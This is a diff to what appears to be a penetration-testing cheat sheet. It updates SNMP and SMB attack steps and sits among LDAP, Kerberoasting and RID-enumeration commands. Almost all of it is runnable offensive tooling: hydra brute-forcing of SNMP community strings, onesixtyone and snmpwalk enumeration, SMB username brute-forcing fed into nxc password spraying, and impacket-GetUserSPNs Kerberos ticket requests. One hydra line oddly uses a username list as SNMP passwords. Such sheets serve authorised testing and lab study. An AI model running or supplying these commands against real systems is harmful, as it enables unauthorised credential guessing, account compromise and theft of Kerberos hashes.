@@ -340,12 +340,16 @@ nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=80530636
 while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs $DOM/ -dc-ip $TARGET -request-user '$user' -k -no-pass; done < usernames
 
 [*] (161) SNMP
-hydra -L usernames -P passwords snmp://$TARGET -t35
+(hydra snmpv2c://$TARGET -P /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -t60 -o SNMPsmall.hydra &)
+(hydra snmpv2c://$TARGET -P /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t60 -o SNMPhuge.hydra &)
+
+cat *.hydra
+
+snmp-check $TARGET -c COMMUNITY
 
 sudo nmap -sU -p161 --script "snmp* and not snmp-brute" $TARGET
-onesixtyone $TARGET -c STRING_WORDLIST
-snmp-check $TARGET -c VALID_STRING
-snmpwalk -v1 -c public $TARGET | grep 'STRING:'
+onesixtyone $TARGET -c SNMPcommunities
+snmpwalk -v1 -c SNMPstring $TARGET | grep 'STRING:'
 
 [*] (389) LDAP
 (nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET' &)
@@ -357,7 +361,7 @@ nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SA
 godap $TARGET -u '$USERNAME' -p '$PASSWORD'
 
 [*] (445) SMB
-hydra -L usernames -e ns smb2://$TARGET -t35 2>/dev/null | awk '{print $5}' > SMBusernames; (nxc smb "10.10.69.134" -u SMBusernames -p SMBusernames --continue-on-success | grep -vE '[*]|[-]|(Guest)' | sed '1s/^/\n/' | tee SMBspray &)
+hydra smb2://$TARGET -L usernames -e ns -t35 2>/dev/null | awk '{print $5}' > SMBusernames; (nxc smb "10.10.69.134" -u SMBusernames -p SMBusernames --continue-on-success | grep -vE '[*]|[-]|(Guest)' | sed '1s/^/\n/' | tee SMBspray &)
 
 (nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' | tee -a usernames &)
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
